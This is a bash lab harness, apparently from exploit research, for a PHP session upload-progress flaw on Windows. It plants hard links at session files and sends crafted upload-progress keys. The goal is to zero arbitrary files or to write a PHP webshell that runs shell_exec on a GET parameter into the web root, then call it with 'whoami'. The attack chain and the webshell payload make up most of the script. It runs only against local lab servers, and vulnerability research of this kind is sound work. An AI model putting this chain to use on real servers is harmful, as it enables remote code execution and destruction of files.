#!/bin/bash
# wp4_win_lab.sh - Finding C pass 4: KILL THE PRIVILEGE REQUIREMENT (Windows lane).
# Hard links (mklink /H, PHP link(), python os.link) need NO privilege and NO
# SeCreateSymbolicLink - only write access to save_path (+ same volume). Test which
# zero9 primitives survive with a HARDLINK at sess_<sid> instead of a symlink.
# Writes: wp4/receipts/*.log
#   H1  control: regular sess file + pipe key              -> wiped (parity)
#   H2  hardlink -> decodable target + pipe key            -> TARGET ZEROED (same-inode
#       ftruncate via the reject empty-write), link name survives (no unlink on reject)
#   H3  hardlink -> decodable target + clean key, cleanup=1 -> final == original bytes
#       (FILE_END cleanup rewrite; W4 parity through hardlink)
#   H6  hardlink -> no-pipe php target + pipe key          -> decode fail -> destroy
#       unlinks LINK NAME only, target intact (source-predicted negative)
#   H7  same + payload key + cleanup=0                     -> same negative
#   H8  hardlink -> EMPTY target + payload key, cleanup=1  -> shell written during
#       updates then WIPED at FILE_END (empty re-encode -> empty write) -> 0 bytes
#   H4  hardlink -> EMPTY docroot/empty.php + payload key + cleanup=0 -> WEBSHELL
#   H5  hardlink -> docroot/sessfmt.php ("pref|s:6:...") + payload key + cleanup=0
#       -> original session vars PREFIX the webshell -> WEBSHELL
#   X1  plant the H4 shape from a FILTERED (non-elevated) token -> same RCE
#   X3  plant the W6 dangling-symlink shape from a FILTERED token (Dev Mode) -> RCE
WP4=/c/Users/andre/Downloads/php2shell-claude
WP3=$WP4/wp3
PY=/c/Python313/python
UPCLIENT=$WP3/../wp2/wp2_upclient.py
REC=$WP4/wp4/receipts
PHP85=$WP3/winphp/8512/php.exe
PHP81=$WP3/winphp/8134/php.exe
mkdir -p "$REC"
SRVPID=""

hexkey() { "$PY" -c 'import sys;print(sys.argv[1].encode().hex())' "$1"; }

mkhardlink() { # $1=link(msys) $2=target(msys), same volume, target must exist.
  # cmd mklink /H first (receipted), python os.link as fallback (also receipted unpriv).
  local l=$(cygpath -w "$1") t=$(cygpath -w "$2")
  cmd //c "mklink /H $l $t" >/dev/null 2>&1 && return 0
  "$PY" -c 'import os,sys; os.link(sys.argv[1], sys.argv[2])' "$t" "$l" 2>/dev/null && return 0
  return 1
}

plant_unpriv() { # $1=mode(hardlink|symlink) $2=link(msys) $3=target(msys)
  local mode="$1" l=$(cygpath -w "$2") t=$(cygpath -w "$3")
  rm -f "$2"
  "$PY" "$WP4/wp4/wp4_plant.py" "$mode" "$l" "$t"   # helper self-delegates via runas
  local i
  for i in $(seq 1 60); do
    if [ "$mode" = hardlink ] && [ -e "$2" ]; then return 0; fi
    if [ "$mode" = symlink ] && [ -L "$2" ]; then return 0; fi
    sleep 0.15
  done
  return 1
}

start_server() { # $1=phpexe $2=labdir $3=port $4=cleanup(0|1)
  local exe="$1" lab="$2" port="$3" cleanup="$4"
  local drive=$(cygpath -m "$lab")
  mkdir -p "$lab/sess" "$lab/tmp" "$lab/docroot"
  cat > "$lab/php.ini" <<EOF
session.save_handler = files
session.save_path = "$drive/sess"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = $cleanup
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
max_file_uploads = 64
memory_limit = 1024M
upload_tmp_dir = "$drive/tmp"
EOF
  cp "$WP3/docroot/up.php" "$lab/docroot/up.php"
  "$exe" -c "$lab/php.ini" -S 127.0.0.1:$port -t "$lab/docroot" \
    >> "$lab/server_out.log" 2>> "$lab/server_err.log" &
  SRVPID=$!
  local i
  for i in $(seq 1 80); do
    curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$port/up.php" && return 0
    sleep 0.25
  done
  echo "SERVER-START-FAILED port=$port"; return 1
}

stop_server() {
  if [ -n "$SRVPID" ]; then
    kill "$SRVPID" 2>/dev/null; sleep 1.2
    kill -0 "$SRVPID" 2>/dev/null && kill -9 "$SRVPID" 2>/dev/null
    sleep 0.3
  fi
  SRVPID=""
}

snap() {
  local f="$1"
  if [ -e "$f" ]; then
    echo "EXISTS size=$(stat -c %s "$f") nlink=$(stat -c %h "$f") head=$(head -c 60 "$f" | tr -d '\0' | tr '\n' ' ')"
  else
    echo "MISSING"
  fi
}

linkstate() {
  if [ -L "$1" ]; then echo "SYMLINK->$(readlink "$1")"
  elif [ -e "$1" ]; then echo "HARDLINK/REGULAR nlink=$(stat -c %h "$1") size=$(stat -c %s "$1")"
  else echo "GONE"; fi
}

shot() { # $1=port $2=mode $3=sid $4=keyhex
  local port="$1" mode="$2" sid="$3" key="$4"; shift 4
  "$PY" "$UPCLIENT" "$port" "$mode" "$sid" --key "$key" --timeout 60 "$@" 2>&1
}

run_ver() { # $1=ver(8512|8134) $2=phpexe $3=portC1 $4=portC0
  local ver="$1" exe="$2" pc="$3" pn="$4"
  local lab="$WP4/wp4/win_lab/$ver"
  local out="$REC/${ver}_hardlink_matrix.log"
  rm -rf "$lab"; mkdir -p "$lab"
  rm -f "$lab/server_out.log" "$lab/server_err.log"
  : > "$out"
  echo "================ PHP $ver (Windows ZTS) — HARDLINK lane ================" | tee -a "$out"
  start_server "$exe" "$lab" "$pc" 1 || return 1
  echo "ini save_path: $("$exe" -c "$lab/php.ini" -r 'echo ini_get("session.save_path");')" | tee -a "$out"

  # ---------- H1: control (regular sess + pipe) ----------
  local sid=h1aaaaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/sess/sess_$sid"
  echo "--- H1 regular sess file + pipe poison (control)" | tee -a "$out"
  echo "before: $(snap "$lab/sess/sess_$sid")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_h1_client.log"
  echo "after:  $(snap "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- H2: hardlink -> decodable target + pipe ----------
  sid=h2aaaaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/target_h2.txt"
  rm -f "$lab/sess/sess_$sid"
  mkhardlink "$lab/sess/sess_$sid" "$lab/target_h2.txt" || echo "MKHARDLINK-FAILED-H2" | tee -a "$out"
  echo "--- H2 HARDLINK -> decodable target + pipe poison (zeroing primitive)" | tee -a "$out"
  echo "target before: $(snap "$lab/target_h2.txt")" | tee -a "$out"
  echo "link before:   $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_h2_client.log"
  echo "target after:  $(snap "$lab/target_h2.txt")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- H3: hardlink -> decodable target + clean key, cleanup=1 ----------
  sid=h3aaaaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/target_h3.txt"
  rm -f "$lab/sess/sess_$sid"
  mkhardlink "$lab/sess/sess_$sid" "$lab/target_h3.txt" || echo "MKHARDLINK-FAILED-H3" | tee -a "$out"
  echo "--- H3 HARDLINK -> decodable target + CLEAN key, cleanup=1 (restore semantics)" | tee -a "$out"
  echo "target before: $(snap "$lab/target_h3.txt")" | tee -a "$out"
  shot "$pc" full "$sid" 6f6b > "$REC/${ver}_h3_client.log"
  echo "target after:  $(snap "$lab/target_h3.txt")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- H6: hardlink -> NO-PIPE php target + pipe ----------
  sid=h6aaaaaaaaaaaaaaaaaaaaaaaaaa
  printf '<?php echo "REAL";' > "$lab/target_h6.php"
  rm -f "$lab/sess/sess_$sid"
  mkhardlink "$lab/sess/sess_$sid" "$lab/target_h6.php" || echo "MKHARDLINK-FAILED-H6" | tee -a "$out"
  echo "--- H6 HARDLINK -> no-pipe php target + pipe poison (decode-fail negative)" | tee -a "$out"
  echo "target before: $(snap "$lab/target_h6.php")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_h6_client.log"
  echo "target after:  $(snap "$lab/target_h6.php")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- H8: hardlink -> EMPTY target + payload key, cleanup=1 ----------
  sid=h8aaaaaaaaaaaaaaaaaaaaaaaaaa
  : > "$lab/target_h8.txt"
  rm -f "$lab/sess/sess_$sid"
  mkhardlink "$lab/sess/sess_$sid" "$lab/target_h8.txt" || echo "MKHARDLINK-FAILED-H8" | tee -a "$out"
  local PAYLOAD='<?php echo "WP4_RCE_OK[".shell_exec($_GET["c"])."]"; ?>'
  echo "--- H8 HARDLINK -> EMPTY target + payload key, cleanup=1 (FILE_END wipe)" | tee -a "$out"
  shot "$pc" full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/${ver}_h8_client.log"
  echo "target after:  $(snap "$lab/target_h8.txt")" | tee -a "$out"
  stop_server

  # ---------- H4/H5 on cleanup=0: webshell via hardlink ----------
  start_server "$exe" "$lab" "$pn" 0 || return 1
  sid=h4aaaaaaaaaaaaaaaaaaaaaaaaaa
  : > "$lab/docroot/empty.php"
  rm -f "$lab/sess/sess_$sid"
  mkhardlink "$lab/sess/sess_$sid" "$lab/docroot/empty.php" || echo "MKHARDLINK-FAILED-H4" | tee -a "$out"
  echo "--- H4 HARDLINK -> docroot/empty.php (0 bytes) + payload key + cleanup=0" | tee -a "$out"
  echo "shell before: $(snap "$lab/docroot/empty.php")" | tee -a "$out"
  shot "$pn" full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/${ver}_h4_client.log"
  echo "shell after:  $(snap "$lab/docroot/empty.php")" | tee -a "$out"
  if [ -e "$lab/docroot/empty.php" ] && [ -s "$lab/docroot/empty.php" ]; then
    cp "$lab/docroot/empty.php" "$REC/${ver}_h4_shell.php"
    echo "shell content (first 300B):" | tee -a "$out"
    head -c 300 "$lab/docroot/empty.php" | tee -a "$out"; echo | tee -a "$out"
  fi
  echo "--- H4b GET /empty.php?c=whoami" | tee -a "$out"
  curl -s --max-time 10 "http://127.0.0.1:$pn/empty.php?c=whoami" | head -c 200 | tee -a "$out"; echo | tee -a "$out"

  sid=h5aaaaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/docroot/sessfmt.php"
  rm -f "$lab/sess/sess_$sid"
  mkhardlink "$lab/sess/sess_$sid" "$lab/docroot/sessfmt.php" || echo "MKHARDLINK-FAILED-H5" | tee -a "$out"
  echo "--- H5 HARDLINK -> docroot/sessfmt.php (non-empty decodable) + payload + cleanup=0" | tee -a "$out"
  echo "shell before: $(snap "$lab/docroot/sessfmt.php")" | tee -a "$out"
  shot "$pn" full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/${ver}_h5_client.log"
  echo "shell after:  $(snap "$lab/docroot/sessfmt.php")" | tee -a "$out"
  if [ -e "$lab/docroot/sessfmt.php" ] && [ -s "$lab/docroot/sessfmt.php" ]; then
    cp "$lab/docroot/sessfmt.php" "$REC/${ver}_h5_shell.php"
  fi
  echo "--- H5b GET /sessfmt.php?c=whoami" | tee -a "$out"
  curl -s --max-time 10 "http://127.0.0.1:$pn/sessfmt.php?c=whoami" | head -c 200 | tee -a "$out"; echo | tee -a "$out"
  stop_server
  cp "$lab/server_out.log" "$lab/server_err.log" "$REC/${ver}_hardlink_srv.log" 2>/dev/null
  echo "=== end $ver hardlink matrix ===" | tee -a "$out"
}

echo "###### PHASE A: hardlink matrix, elevated lab (server identity = andre) ######"
run_ver 8512 "$PHP85" 18811 18813
run_ver 8134 "$PHP81" 18812 18814
echo "receipts: $REC"
